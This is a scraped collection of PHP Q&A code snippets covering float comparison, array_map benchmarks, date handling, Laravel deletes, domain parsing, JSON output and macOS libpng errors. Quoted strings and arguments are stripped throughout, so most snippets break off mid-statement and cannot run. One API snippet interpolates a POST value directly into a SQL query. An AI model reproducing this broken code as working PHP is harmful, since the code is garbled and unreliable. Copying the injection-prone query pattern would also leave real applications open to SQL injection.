class Foo { private $_bar; private $_baz; public function getBar() { return $this->_bar; } public function setBar($value) { $this->_bar = $value; } public function getBaz() { return $this->_baz; } public function getBarBaz() { return $this->_bar . } public function __get($var) { $func = if (method_exists($this, $func)) { return $this->$func(); } else { throw new InexistentPropertyException("Inexistent property: $var"); } } public function __set($var, $value) { $func = if (method_exists($this, $func)) { $this->$func($value); } else { if (method_exists($this, { throw new ReadOnlyException("property $var is read-only"); } else { throw new InexistentPropertyException("Inexistent property: $var"); } } } }
public function __call($val, $x) { if(substr($val, 0, 3) == $varname = strtolower(substr($val, 3)); } else { throw new Exception( } if(property_exists( return $this->$varname; } else { throw new Exception( } }
$a = 0.17; $b = 1 - 0.83; if($a == $b ){ echo } else { echo }
<?php $a = 0.17; $b = 1 - 0.83; echo "$a == $b (core comp oper): ", var_dump($a==$b); echo "$a == $b (with bc func) : ", var_dump( bccomp($a, $b)==0 );
0.17 == 0.17 (core comp oper): bool(false) 0.17 == 0.17 (with bc func) : bool(true)
$a = round(0.17, 2); $b = round(1 - 0.83, 2); if($a == $b ){ echo } else { echo }
$a = 0.17; $b = 1 - 0.83; if (number_format($a, 3) == number_format($b, 3)) { echo } else { echo }
$payments_total = 123.45; $order_total = 123.45; if (round($payments_total, 2) != round($order_total, 2)) { }
<?php function getRand(){ return ( ((float)mt_rand()) / ((float) mt_getrandmax()) ); } $a = 10.0 * getRand(); $b = 10.0 * getRand(); settype($a, settype($b, for($idx = 0;$idx<strlen($a);$idx++){ if($a[$idx] > $b[$idx]){ echo "{$a} is greater than {$b}.<br>"; break; } else{ echo "{$b} is greater than {$a}.<br>"; break; } } ?>
Beech:~ adamw$ php -v PHP 5.3.1 (cli) (built: Feb 11 2010 02:32:22) Copyright (c) 1997-2009 The PHP Group Zend Engine v2.3.0, Copyright (c) 1998-2009 Zend Technologies Beech:~ adamw$ php -f test.php a and b are same
$parcela= $tax = (double) $taxaPercent=round((100*$tax)/$parcela,2); $min=(double) if($taxaPercent < $min ){ }
uasort($_units[$k], function($a, $b) { $r = 0; if ($a->getFloatVal() > $b->getFloatVal()) $r = 1; if ($a->getFloatVal() < $b->getFloatVal()) $r = -1; return $r * -1; } );
function floatcmp($f1,$f2,$precision = 10) { $e = pow(10,$precision); return (intval($f1 * $e) == intval($f2 * $e)); }
$a = 0.17; $b = 0.17; echo floatcmp($a,$b) ? echo floatcmp($a,$b + 0.01) ?
function compareFloats($a, $b){ list($a_int, $a_dec) = explode( list($b_int, $b_dec) = explode( if(intval($a_int) == intval($b_int) && intval($a_dec) == intval($b_dec)){ return }else{ if((intval($a_int) < intval($b_int)) || (intval($a_int) === intval($b_int) && intval($a_dec) < intval($b_dec))){ return } if((intval($a_int) > intval($b_int)) || (intval($a_int) === intval($b_int) && intval($a_dec) > intval($b_dec))){ return } return } }
$result = array(); foreach ($numbers as $number) { $result[] = $number * 10; } return $result;
return array_map(function($number) { return $number * 10; }, $numbers);
function tenTimes($number) { return $number * 10; } return array_map(
function lap($func) { $t0 = microtime(1); $numbers = range(0, 1000000); $ret = $func($numbers); $t1 = microtime(1); return array($t1 - $t0, $ret); } function useForeach($numbers) { $result = array(); foreach ($numbers as $number) { $result[] = $number * 10; } return $result; } function useMapClosure($numbers) { return array_map(function($number) { return $number * 10; }, $numbers); } function _tenTimes($number) { return $number * 10; } function useMapNamed($numbers) { return array_map( } foreach (array( list($delay,) = lap("use$callback"); echo "$callback: $delay\n"; }
function useMapClosure($numbers) { $closure = function($number) { return $number * 10; }; return array_map($closure, $numbers); }
compiled vars: !0 = $numbers, !1 = $result, !2 = $number line --------------------------------------------------------------------------------- 10 0 > EXT_NOP 1 RECV 1 11 2 EXT_STMT 3 INIT_ARRAY ~0 4 ASSIGN !1, ~0 12 5 EXT_STMT 6 > FE_RESET $2 !0, ->15 7 > > FE_FETCH $3 $2, ->15 8 > OP_DATA 9 ASSIGN !2, $3 13 10 EXT_STMT 11 MUL ~6 !2, 10 12 ASSIGN_DIM !1 13 OP_DATA ~6, $7 14 14 > JMP ->7 15 > SWITCH_FREE $2 15 16 EXT_STMT 17 > RETURN !1 16 18* EXT_STMT 19* > RETURN null
compiled vars: !0 = $numbers line --------------------------------------------------------------------------------- 18 0 > EXT_NOP 1 RECV 1 19 2 EXT_STMT 3 EXT_FCALL_BEGIN 4 DECLARE_LAMBDA_FUNCTION 21 5 SEND_VAL ~0 6 SEND_VAR !0 7 DO_FCALL 2 $1 8 EXT_FCALL_END 9 > RETURN $1 22 10* EXT_STMT 11* > RETURN null
compiled vars: !0 = $number line --------------------------------------------------------------------------------- 19 0 > EXT_NOP 1 RECV 1 20 2 EXT_STMT 3 MUL ~0 !0, 10 4 > RETURN ~0 21 5* EXT_STMT 6* > RETURN null
compiled vars: !0 = $numbers line --------------------------------------------------------------------------------- 28 0 > EXT_NOP 1 RECV 1 29 2 EXT_STMT 3 EXT_FCALL_BEGIN 4 SEND_VAL 5 SEND_VAR !0 6 DO_FCALL 2 $0 7 EXT_FCALL_END 8 > RETURN $0 30 9* EXT_STMT 10* > RETURN null
compiled vars: !0 = $number line --------------------------------------------------------------------------------- 24 0 > EXT_NOP 1 RECV 1 25 2 EXT_STMT 3 MUL ~0 !0, 10 4 > RETURN ~0 26 5* EXT_STMT 6* > RETURN null
ForEach : 0.79232501983643 MapClosure: 4.1082420349121 MapNamed : 1.7884571552277
ForEach : 0.69830799102783 MapClosure: 0.78584599494934 MapNamed : 0.85125398635864
function useMapClosureI($numbers) { $i = 10; return array_map(function($number) use ($i) { return $number * $i++; }, $numbers); }
function useForEachI($numbers) { $result = array(); $i = 10; foreach ($numbers as $number) { $result[] = $number * $i++; } return $result; }
PHP 5.6 ForEach : 0.57499806880951 MapClosure : 0.59327731132507 MapNamed : 0.69694859981537 MapClosureI: 0.73265469074249 ForEachI : 0.60068697929382 PHP 7 ForEach : 0.11297199726105 MapClosure : 0.16404168605804 MapNamed : 0.11067249774933 MapClosureI: 0.19481580257416 ForEachI : 0.10989861488342 HHVM ForEach : 0.090071058273315 MapClosure : 0.10432276725769 MapNamed : 0.1091267824173 MapClosureI: 0.11197068691254 ForEachI : 0.092114186286926
function test_array_map($data){ return array_map(function($row){ return array( ); }, $data); } function test_array_map_use_local($data){ $i = 0; return array_map(function($row) use ($i) { $i++; return array( ); }, $data); } function test_foreach($data){ $result = array(); foreach ($data as $row) { $tmp = array(); $tmp[ $tmp[ $tmp[ $result[] = $tmp; } return $result; } function test_foreach_use_local($data){ $result = array(); $i = 0; foreach ($data as $row) { $i++; $tmp = array(); $tmp[ $tmp[ $tmp[ $result[] = $tmp; } return $result; }
$data = array_fill(0, 10000, array( )); $tests = array( ); for ($i = 0; $i < 100; $i++){ foreach ($tests as $testName => &$records) { $start = microtime(true); call_user_func("test_$testName", $data); $delta = microtime(true) - $start; $records[] = $delta; } } foreach ($tests as $name => &$records) { printf( array_sum($records) / count($records), $name); }
Deprecated: Assigning the return value of new by reference is deprecated in /home Deprecated: Assigning the return value of new by reference is deprecated in /home Deprecated: Assigning the return value of new by reference is deprecated in /home Deprecated: Assigning the return value of new by reference is deprecated in /home Deprecated: Assigning the return value of new by reference is deprecated in /home
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING | E_DEPRECATED));
require_once( ABSPATH . error_reporting( E_ALL ^ ( E_NOTICE | E_WARNING | E_DEPRECATED ) );
$errorlevel=error_reporting(); $errorlevel=error_reporting($errorlevel & ~E_DEPRECATED);
<?php include( $result = mysql_query( $rows = array(); while($row = mysql_fetch_assoc($result)){ $rows[] = $row; } echo json_encode($rows); ?>
CREATE TABLE `staff` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` longtext COLLATE utf8_unicode_ci, `description` longtext COLLATE utf8_unicode_ci, `icon` longtext COLLATE utf8_unicode_ci, `date` longtext COLLATE utf8_unicode_ci, `company` longtext COLLATE utf8_unicode_ci, `companyurl` longtext COLLATE utf8_unicode_ci, `appurl` longtext COLLATE utf8_unicode_ci, PRIMARY KEY (`id`) ) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci
[{"id":"4","name":"Noter 2","description":null,"icon":"http:\/\/images.apple.com\/webapps\/productivity\/images\/noter2_20091223182720-thumb.jpg","date":"1262032317","company":"dBelement, LLC","companyurl":"http:\/\/dbelement.com\/","appurl":"http:\/\/noter2.dbelement.com"},{"id":"3","name":"Noter 2","description":null,"icon":"http:\/\/images.apple.com\/webapps\/productivity\/images\/noter2_20091223182720-thumb.jpg","date":"1262032317","company":"dBelement, LLC","companyurl":"http:\/\/dbelement.com\/","appurl":"http:\/\/noter2.dbelement.com"}]
0 = JSON_ERROR_NONE 1 = JSON_ERROR_DEPTH 2 = JSON_ERROR_STATE_MISMATCH 3 = JSON_ERROR_CTRL_CHAR 4 = JSON_ERROR_SYNTAX 5 = JSON_ERROR_UTF8
while($row = mysql_fetch_assoc($result)){ $rows[] = array_map( }
<?php $encoded_rows = array_map( echo json_encode($encoded_rows); ?>
<?php include( $result = mysql_query( $rows = array(); while($row = mysql_fetch_assoc($result)){ $rows[] = $row; } echo json_encode($rows); ?>
echo date("Y-m-d", strtotime( echo date("Y-m-d", strtotime(
$date = echo date("Y-m-d", strtotime( echo date("Y-m-d", strtotime( $date = echo date("Y-m-d", strtotime( echo date("Y-m-d", strtotime(
<?php $dateTime = new \DateTime( $monday = clone $dateTime->modify(( $sunday = clone $dateTime->modify( ?>
$givenday = date("w", mktime(0, 0, 0, MM, dd, yyyy));
function firstDayOfWeek($date) { $day = DateTime::createFromFormat( $day->setISODate((int)$day->format( return $day->format( } var_dump(firstDayOfWeek(
strtotime("next monday"); strtotime("this sunday"); strtotime("last sunday");
$custom_date = strtotime( date( $week_start = date( $week_end = date( echo echo
$first_day_of_week = date( $last_day_of_week = date(
$m = strtotime( $today = date( $custom_date = strtotime( date( if ($today == $week_start = date("d-m-Y", $m); } else { $week_start = date( } if ($today == $week_end = date("d-m-Y", $m); } else { $week_end = date( } echo echo
$date = date( $nbDay = date( $monday = new DateTime($date); $sunday = new DateTime($date); $monday->modify( $sunday->modify(
$day_of_week = date( $week_first_day = date( $week_last_day = date(
function week_start_date($wk_num, $yr, $first = 1, $format = { $wk_ts = strtotime( $mon_ts = strtotime( return date($format, $mon_ts); } $sStartDate = week_start_date($week_number, $year); $sEndDate = date(
<?php $weekstart = strtotime( $weekstop = strtotime( ?>
<?php function startOfWeek($aDate){ $d=strtotime($aDate); return strtotime(date( } echo(date( ?>
$today_day = date( $start_of_week = date( $end_of_week = date( if($today_day != "Mon") $start_of_week = date( if($today_day != "Sun") $end_of_week = date(
$date = $day = date( $week_start = date( $week_end = date(
class DateTimeUtilities { public static function getPeriodFromMondayUntilFriday($offset = $now = new \DateTimeImmutable($offset, new \DateTimeZone( $today = $now->setTime(0, 0, 1); $daysFromMonday = $today->format( $monday = $today->sub(new \DateInterval(sprintf( $saturday = $monday->add(new \DateInterval( return new \DatePeriod($monday, new \DateInterval( } } foreach (DateTimeUtilities::getPeriodFromMondayUntilFriday() as $day) { print $day->format( print PHP_EOL; }
foreach (DateTimeUtilities::getPeriodFromMondayUntilFriday( print $day->format( print PHP_EOL; }
$monday = DateTimeUtilities::getPeriodFromMondayUntilFriday( print $monday;
<?php date_default_timezone_set( $start_date = strtotime( $today_or_previous_sunday = mktime(0, 0, 0, date( echo date( ?>
$year = $month = $day = $date = DateTime::createFromFormat( $day = date( if($day!=0){ $newdate = $date->getTimestamp() - $day * 86400; if($old = date( if($old == 0){ $newdate -= 3600; } else { $newdate += 3600; } } $date->setTimestamp($newdate); } echo $date->format(
$firstDay = (new \DateTime())->modify(sprintf( ->setTime(0, 0, 0); $lastDay = (new \DateTime())->modify(sprintf( ->setTime(23, 59, 59);
/** * @param DateTime $date A given date * @param int $firstDay 0-6, Sun-Sat respectively * @return DateTime */ function getFirstDayOfWeek(DateTime $date, $firstDay = 0) { $offset = 7 - $firstDay; $ret = clone $date; $ret->modify(-(($date->format( return $ret; }
$date = "2013-03-18"; $searchRow = date("d.m.Y", strtotime( echo "for date " .$date ." we get this monday: " ;echo $searchRow; echo
class User extends Eloquent { public function photos() { return $this->has_many( } public static function boot() { parent::boot(); static::deleting(function($user) { $user->photos()->delete(); }); } }
<?php class User extends Eloquent { public function photos() { return $this->has_many( } public function delete() { $this->photos()->delete(); return parent::delete(); } }
public function photos() { return $this->hasMany( }
$user = User::find($id); $user->photos()->delete(); $user->delete();
<?php class AppServiceProvider extends ServiceProvider { /** * Bootstrap any application services. * * @return void */ public function boot() { User::deleting(function ($user) { $user->photos()->delete(); }); }
class User extends Eloquent { public static function boot() { parent::boot(); static::deleting(function($user) { $user->photos()->delete(); }); } }
public function boot() { User::observe(UserObserver::class); }
class UserObserver { public function deleting(User $user) { $user->photos()->delete(); } }
try { $user = user::findOrFail($id); if ($user->has( foreach ($user->photos as $photo) { $user->photos()->detach($photo); } } $user->delete(); return } catch (Exception $e) { dd($e); }
public function detach(){ try { if ($this->has( foreach ($this->photos as $photo) { $this->photos()->detach($photo); } } } catch (Exception $e) { dd($e); } }
class User extends Eloquent { /** * The "booting" method of the model. * * @return void */ public static function boot() { parent::boot(); static::deleting(function($user) { $user->photos()->get()->each->delete(); }); } }
class User extends Eloquent { /** * The "booting" method of the model. * * @return void */ public static function boot() { parent::boot(); static::deleting(function($user) { $user->photos()->get([ }); } }
try { DB::connection()->pdo->beginTransaction(); $photos = Photo::where( $user = Geofence::where( DB::connection()->pdo->commit(); }catch(\Laravel\Database\Exception $e) { DB::connection()->pdo->rollBack(); Log::exception($e); }
<?php if (!empty($_SERVER[ $uri = } else { $uri = } $uri .= $_SERVER[ header( exit; ?>
$cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[ $cfg[
$dbuser= $dbpass= $basepath= $dbname= $dbserver= $dbport= $dbtype=
function example() { return array( ); } $arr = example();
$array = [1=> $array = array_flip($array); echo $array[
<?php $array = array( while ($fruit_name = current($array)) { if ($fruit_name == echo key($array). } next($array); } ?>
[ {"region":"valore","price":"valore2"}, {"region":"valore","price":"valore2"}, {"region":"valore","price":"valore2"} ]
<?php $arr = array( array( "region" => "valore", "price" => "valore2" ), array( "region" => "valore", "price" => "valore2" ), array( "region" => "valore", "price" => "valore2" ) ); echo json_encode($arr); ?>
$named_array = array( "nome_array" => array( array( "foo" => "bar" ), array( "foo" => "baz" ) ) ); echo json_encode($named_array);
$arr = [ [ "region" => "valore", "price" => "valore2" ], [ "region" => "valore", "price" => "valore2" ], [ "region" => "valore", "price" => "valore2" ] ]; echo json_encode($arr);
$json_data = $lang_data = json_decode($json_data); var_dump($lang_data);
<?php $username=urldecode($_POST[ $user="select * from tbl_registration where member_id= $rsuser = $obj->select($user); if(count($rsuser)>0) { $cheknew="select name,ldate,offer_photo from tbl_offer where status=1 "; $rscheknew = $obj->selectjson($cheknew); if(count($rscheknew)>0) { $nik=json_encode($rscheknew); echo "{\"status\" : \"200\" ,\"responce\" : \"201\", \"message\" : \"Get Record\",\"feed\":".str_replace("<p>","",$nik). "}"; } else { $row2="No Record Found"; $nik1=json_encode($row2); echo "{\"status\" : \"202\", \"responce\" : \"604\",\"message\" : \"No Record Found \",\"feed\":".str_replace("<p>","",$nik1). "}"; } } else { $row2="Invlid User"; $nik1=json_encode($row2); echo "{\"status\" : \"404\", \"responce\" : \"602\",\"message\" : \"Invlid User \",\"feed\":".str_replace("<p>","",$nik1). "}"; } ?>
Array( [0] => Array ( [0] => hello [1] => open ) [1] => Array ( [0] => good [1] => center ) [2] => Array ( [0] => hello [1] => close ) )
Array( [0] => Array ( [0] => hello [1] => open ) [2] => Array ( [0] => hello [1] => close ) )
<?php $start_time = microtime(TRUE); session_start(); $end_time = microtime(TRUE); echo $end_time - $start_time;
[XDebug] zend_extension = h:\xampp\php\ext\php_xdebug-2.1.1-5.3-vc6.dll xdebug.remote_enable=true xdebug.profiler_enable_trigger=1 xdebug.profiler_output_dir=h:\xampp\cachegrind xdebug.profiler_output_name=callgrind.%t_%R.out
$appgati->Step( $appgati->Step( $report = $appgati->Report( print_r($report);
Array ( [Clock time in seconds] => 1.9502429962158 [Time taken in User Mode in seconds] => 0.632039 [Time taken in System Mode in seconds] => 0.024001 [Total time taken in Kernel in seconds] => 0.65604 [Memory limit in MB] => 128 [Memory usage in MB] => 18.237907409668 [Peak memory usage in MB] => 19.579357147217 [Average server load in last minute] => 0.47 [Maximum resident shared size in KB] => 44900 [Integral shared memory size] => 0 [Integral unshared data size] => 0 [Integral unshared stack size] => [Number of page reclaims] => 12102 [Number of page faults] => 6 [Number of block input operations] => 192 [Number of block output operations] => [Number of messages sent] => 0 [Number of messages received] => 0 [Number of signals received] => 0 [Number of voluntary context switches] => 606 [Number of involuntary context switches] => 99 )
xhprof_enable(XHPROF_FLAGS_CPU + XHPROF_FLAGS_MEMORY);
$this->method = $_SERVER[ if ($this->method == if ($_SERVER[ $this->method = } else if ($_SERVER[ $this->method = } else { throw new Exception("Unexpected Header"); } }
function getHost($Address) { $parseUrl = parse_url(trim($Address)); return trim($parseUrl[ } getHost("example.com"); getHost("http: getHost("www.example.com"); getHost("http:
function domain($url) { global $subtlds; $slds = ""; $url = strtolower($url); $host = parse_url( preg_match("/[^\.\/]+\.[^\.\/]+$/", $host, $matches); foreach($subtlds as $sub){ if (preg_match( preg_match("/[^\.\/]+\.[^\.\/]+\.[^\.\/]+$/", $host, $matches); } } return @$matches[0]; } function get_tlds() { $address = $content = file($address); foreach ($content as $num => $line) { $line = trim($line); if($line == if(@substr($line[0], 0, 2) == $line = @preg_replace("/[^a-zA-Z0-9\.]/", if($line == if(@$line[0] == if(!strstr($line, $subtlds[] = $line; } $subtlds = array_merge(array( ), $subtlds); $subtlds = array_unique($subtlds); return $subtlds; }
$subtlds = get_tlds(); echo domain( echo domain( echo domain(
function get_domain($url = SITE_URL) { preg_match("/[a-z0-9\-]{1,63}\.[a-z\.]{2,6}$/", parse_url($url, PHP_URL_HOST), $_domain_tld); return $_domain_tld[0]; } get_domain( get_domain( get_domain(
$extract = new LayerShifter\TLDExtract\Extract(); $url = parse_url($url, PHP_URL_HOST); $result = $extract->parse($url); $result->getFullHost(); $result->getRegistrableDomain(); $result->getSuffix(); $url = parse_url($url, PHP_URL_HOST); $result = $extract->parse($url); $result->getFullHost(); $result->getRegistrableDomain();
static function domain($url) { $slds = ""; $url = strtolower($url); $address = if(!$subtlds = @kohana::cache( { $content = file($address); foreach($content as $num => $line) { $line = trim($line); if($line == if(@substr($line[0], 0, 2) == $line = @preg_replace("/[^a-zA-Z0-9\.]/", if($line == if(@$line[0] == if(!strstr($line, $subtlds[] = $line; } $subtlds = array_merge(Array( ),$subtlds); $subtlds = array_unique($subtlds); @kohana::cache( } preg_match( $host = @$matches[2]; preg_match("/[^\.\/]+\.[^\.\/]+$/", $host, $matches); foreach($subtlds as $sub) { if (preg_match("/{$sub}$/", $host, $xyz)) preg_match("/[^\.\/]+\.[^\.\/]+\.[^\.\/]+$/", $host, $matches); } return @$matches[0]; }
$url = $host = parse_url($url, PHP_URL_HOST); print $host;
$domain = parse_url($url, PHP_URL_HOST); echo implode(
function getHost($url) { $parseUrl = parse_url(trim($url)); if(isset($parseUrl[ { $host = $parseUrl[ } else { $path = explode( $host = $path[0]; } return trim($host); } echo getHost("http: echo getHost("http: echo getHost("https: echo getHost("www.example.net"); echo getHost("subdomain.example.net/anything"); echo getHost("example.net");
function getHost($Address) { $parseUrl = parse_url(trim($Address)); $host = trim($parseUrl[ $parts = explode( $num_parts = count($parts); if ($parts[0] == "www") { for ($i=1; $i < $num_parts; $i++) { $h .= $parts[$i] . } }else { for ($i=0; $i < $num_parts; $i++) { $h .= $parts[$i] . } } return substr($h,0,-1); }
$url = "www.google.co.uk"; $host = parse_url($url, PHP_URL_HOST);
$suffix = [... all valid public suffix ...]; function get_public_suffix($host) { $parts = split("\.", $host); while (count($parts) > 0) { if (is_public_suffix(join(".", $parts))) return join(".", $parts); array_shift($parts); } return false; } function is_public_suffix($host) { global $suffix; return isset($suffix[$host]); } function get_private_domain($host) { $public = get_public_suffix($host); $public_parts = split("\.", $public); $all_parts = split("\.", $host); $private = []; for ($x = 0; $x < count($public_parts); ++$x) $private[] = array_pop($all_parts); if (count($all_parts) > 0) $private[] = array_pop($all_parts); return join(".", array_reverse($private)); }
$host = parse_url( $Row->url, PHP_URL_HOST ); $parts = explode( $parts = array_reverse( $parts ); $domain = $parts[1].
class crawler { protected $_url; protected $_depth; protected $_host; public function __construct($url, $depth = 5) { $this->_url = $url; $this->_depth = $depth; $parse = parse_url($url); $this->_host = $parse[ } public function run() { $this->crawl_page($this->_url, $this->_depth = 5); } public function crawl_page($url, $depth = 5) { static $seen = array(); if (isset($seen[$url]) || $depth === 0) { return; } $seen[$url] = true; list($content, $httpcode) = $this->getContent($url); $dom = new DOMDocument( @$dom->loadHTML($content); $this->processAnchors($dom, $url, $depth); ob_end_flush(); echo "CODE::$httpcode, URL::$url <br>"; ob_start(); flush(); } public function processAnchors($dom, $url, $depth) { $anchors = $dom->getElementsByTagName( foreach ($anchors as $element) { $href = $element->getAttribute( if (0 !== strpos($href, $path = if (extension_loaded( $href = http_build_url($url, array( } else { $parts = parse_url($url); $href = $parts[ if (isset($parts[ $href .= $parts[ } $href .= $parts[ if (isset($parts[ $href .= } $href .= $path; } } if (strpos($href, $this->_host) !== false) $this->crawl_page($href, $depth - 1); } } public function getContent($url) { $handle = curl_init($url); curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE); $response = curl_exec($handle); /* Check for 404 (file not found). */ $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE); if ($httpCode == 404) { } curl_close($handle); return array($response, $httpCode); } } $startURL = $depth = 2; $crawler = new crawler($startURL, $depth); $crawler->run();
function get_url_hostname($url) { $parse = parse_url($url); return str_ireplace( } get_url_hostname(
$url = $parse = parse_url($url); echo $parse[ echo parse_url( echo parse_url(
function getDomain($url) { $domain_array = explode(".", str_replace( $count = count($domain_array); if( $count>=3 && strlen($domain_array[$count-2])==2 ) { return implode( } else if( $count>=2 ) { return implode( } } echo getDomain( echo getDomain( echo getDomain( echo getDomain( echo getDomain( echo getDomain( echo getDomain( echo getDomain( echo getDomain( echo getDomain(
Include /Applications/MAMP/conf/apache/extra/httpd-php.conf
LoadModule php5_module /Applications/MAMP/bin/php/php5.5.3/modules/libphp5.so
Array ( [0] => item1 [1] => item2 [2] => item3 [3] => item4 )
$array = array(0 => $temp_array = $array[1]; unset($array[1]); array_unshift($array , $temp_array);
<?php $array = [ $array = array_reverse($array); $array[ $array = array_reverse($array);
$arr=array("a"=>"one", "b"=>"two"); $arr=array("c"=>"three", "d"=>"four").$arr; print_r($arr); ------------------- output: ---------------- Array ( [c]=["three"] [d]=["four"] [a]=["two"] [b]=["one"] )
<?php Class MyClass { $foo = 0; public function bar() { return $this->foo; } } $myobject = new MyClass(); $myobject->bar(); ?>
<?php namespace App\Http\Middleware; use Artisan; use Closure; class ClearViewCache { /** * Handle an incoming request. * * @param \Illuminate\Http\Request $request * @param \Closure $next * @return mixed */ public function handle($request, Closure $next) { if (env( Artisan::call( return $next($request); } }
sudo php artisan cache:clear sudo php artisan view:clear sudo php artisan config:cache
dyld: Library not loaded: /usr/local/lib/libpng15.15.dylib Referenced from: /usr/local/bin/php Reason: image not found [1] 4494 trace trap php
$ brew info libpng libpng: stable 1.6.10 (bottled) http: /usr/local/Cellar/libpng/1.5.17 (15 files, 1.0M) Poured from bottle /usr/local/Cellar/libpng/1.5.18 (15 files, 1.0M) Poured from bottle /usr/local/Cellar/libpng/1.6.10 (17 files, 1.3M) * $ brew switch libpng 1.5.18 Cleaning /usr/local/Cellar/libpng/1.5.17 Cleaning /usr/local/Cellar/libpng/1.5.18 Cleaning /usr/local/Cellar/libpng/1.6.10 16 links created for /usr/local/Cellar/libpng/1.5.18
dyld: Library not loaded: /usr/local/lib/libpng16.16.dylib Referenced from: /usr/local/lib/libfreetype.6.dylib Reason: image not found [1] 6993 trace trap phpunit
LAPTOP:folder Username$ php -v dyld: Library not loaded: /usr/local/lib/libpng15.15.dylib Referenced from: /usr/local/bin/php Reason: image not found Trace/BPT trap: 5
LAPTOP:folder Username$ locate libpng15.15.dylib /Applications/GIMP.app/Contents/Resources/lib/libpng15.15.dylib /usr/X11/lib/libpng15.15.dylib /usr/local/Cellar/libpng/1.5.14/lib/libpng15.15.dylib
LAPTOP:folder Username$ ln -s /usr/local/Cellar/libpng/1.5.14/lib/libpng15.15.dylib /usr/local/lib/libpng15.15.dylib
LAPTOP:folder Username$ php -v PHP 5.3.26 (cli) (built: Aug 25 2013 16:07:23) Copyright (c) 1997-2013 The PHP Group Zend Engine v2.3.0, Copyright (c) 1998-2013 Zend Technologies with Xdebug v2.2.3, Copyright (c) 2002-2013, by Derick Rethans
cp /opt/X11/lib/libpng15.15.dylib /usr/local/lib/libpng15.15.dylib
cd /usr/local/lib/ ln -s ../Cellar/libpng/1.5.18/lib/libpng15.15.dylib
$ brew update && brew upgrade $ brew reinstall php55
PHP Warning: PHP Startup: Unable to load dynamic library
int main(void) { void **mem = malloc(sizeof(char)*3); void *ptr; ptr = (char*) mem[5]; memcpy(mem[5], "whatever", sizeof("whatever")); free((void*) mem[3]); return 0; }
krakjoe@fiji:/usr/src/php-src$ valgrind ./corrupt ==9749== Memcheck, a memory error detector ==9749== Copyright (C) 2002-2013, and GNU GPL ==9749== Using Valgrind-3.10.1 and LibVEX; rerun with -h for copyright info ==9749== Command: ./corrupt ==9749== ==9749== Invalid read of size 8 ==9749== at 0x4005F7: main (an.c:10) ==9749== Address 0x51fc068 is 24 bytes after a block of size 16 in arena "client" ==9749== ==9749== Invalid read of size 8 ==9749== at 0x400607: main (an.c:13) ==9749== Address 0x51fc068 is 24 bytes after a block of size 16 in arena "client" ==9749== ==9749== Invalid write of size 2 ==9749== at 0x4C2F7E3: memcpy@@GLIBC_2.14 (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so) ==9749== by 0x40061B: main (an.c:13) ==9749== Address 0x50 is not stack ==9749== ==9749== ==9749== Process terminating with default action of signal 11 (SIGSEGV): dumping core ==9749== Access not within mapped region at address 0x50 ==9749== at 0x4C2F7E3: memcpy@@GLIBC_2.14 (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so) ==9749== by 0x40061B: main (an.c:13) ==9749== If you believe this happened as a result of a stack ==9749== overflow in your program ==9749== possible), you can try to increase the size of the ==9749== main thread stack using the --main-stacksize= flag. ==9749== The main thread stack size used in this run was 8388608. ==9749== ==9749== HEAP SUMMARY: ==9749== in use at exit: 3 bytes in 1 blocks ==9749== total heap usage: 1 allocs, 0 frees, 3 bytes allocated ==9749== ==9749== LEAK SUMMARY: ==9749== definitely lost: 0 bytes in 0 blocks ==9749== indirectly lost: 0 bytes in 0 blocks ==9749== possibly lost: 0 bytes in 0 blocks ==9749== still reachable: 3 bytes in 1 blocks ==9749== suppressed: 0 bytes in 0 blocks ==9749== Rerun with --leak-check=full to see details of leaked memory ==9749== ==9749== For counts of detected and suppressed errors, rerun with: -v ==9749== ERROR SUMMARY: 4 errors from 3 contexts (suppressed: 0 from 0) Segmentation fault
Linux ubuntu 2.6.32-30-generic-pae with PHP Version 5.3.2-1ubuntu4.7
$collection = $db->selectCollection( $collection->ensureIndex(array(
$collection = $db->selectCollection( $collection->ensureIndex(array( $collection->ensureIndex(array(
$link = mysql_connect( mysql_select_db("db", $link);
zend_mm_heap corrupted zend_mm_heap corrupted zend_mm_heap corrupted [Mon Jul 30 09:23:49 2012] [notice] child pid 8662 exit signal Segmentation fault (11) [Mon Jul 30 09:23:50 2012] [notice] child pid 8663 exit signal Segmentation fault (11) [Mon Jul 30 09:23:54 2012] [notice] child pid 8666 exit signal Segmentation fault (11) [Mon Jul 30 09:23:55 2012] [notice] child pid 8670 exit signal Segmentation fault (11)
public function testRead() { $ri = new MediaItemReader(self::getMongoColl( foreach ($ri->dataReader(10) as $data) { } } public function dataReader($numOfItems) { $cursor = $this->getStorage()->find()->limit($numOfItems); var_dump($cursor); foreach ($cursor as $data) { $data[ ]; yield $data; } }
<html> <body> <form action="functioncalling.php"> <input type="text" name="txt" /> <input type="submit" name="insert" value="insert" onclick="insert()" /> <input type="submit" name="select" value="select" onclick="select()" /> </form> <?php function select(){ echo "The select function is called."; } function insert(){ echo "The insert function is called."; } ?>
$( $.ajax({ type: "POST", url: "some.php", data: { name: "John" } }).done(function( msg ) { alert( "Data Saved: " + msg ); }); });
<input type="submit" class="button" name="insert" value="insert" /> <input type="submit" class="button" name="select" value="select" />
$(document).ready(function(){ $( var clickBtnValue = $(this).val(); var ajaxurl = data = { $.post(ajaxurl, data, function (response) { alert("action performed successfully"); }); }); });
<?php if (isset($_POST[ switch ($_POST[ case insert(); break; case select(); break; } } function select() { echo "The select function is called."; exit; } function insert() { echo "The insert function is called."; exit; } ?>
<form action="theSamePage.php" method="post"> <input type="submit" name="someAction" value="GO" /> </form>
<?php if($_SERVER[ { func(); } function func() { } ?>
<?php if($_GET){ if(isset($_GET[ insert(); }elseif(isset($_GET[ select(); } } function select() { echo "The select function is called."; } function insert() { echo "The insert function is called."; } ?>.
<?php if(isset($_POST[ $message= "The insert function is called."; } if(isset($_POST[ $message="The select function is called."; } ?> <form method="post"> <input type="text" name="txt" value="<?php if(isset($message)){ echo $message;}?>" > <input type="submit" name="insert" value="insert"> <input type="submit" name="select" value="select" > </form>
<html> <body> <form action="foo.php" method="post">
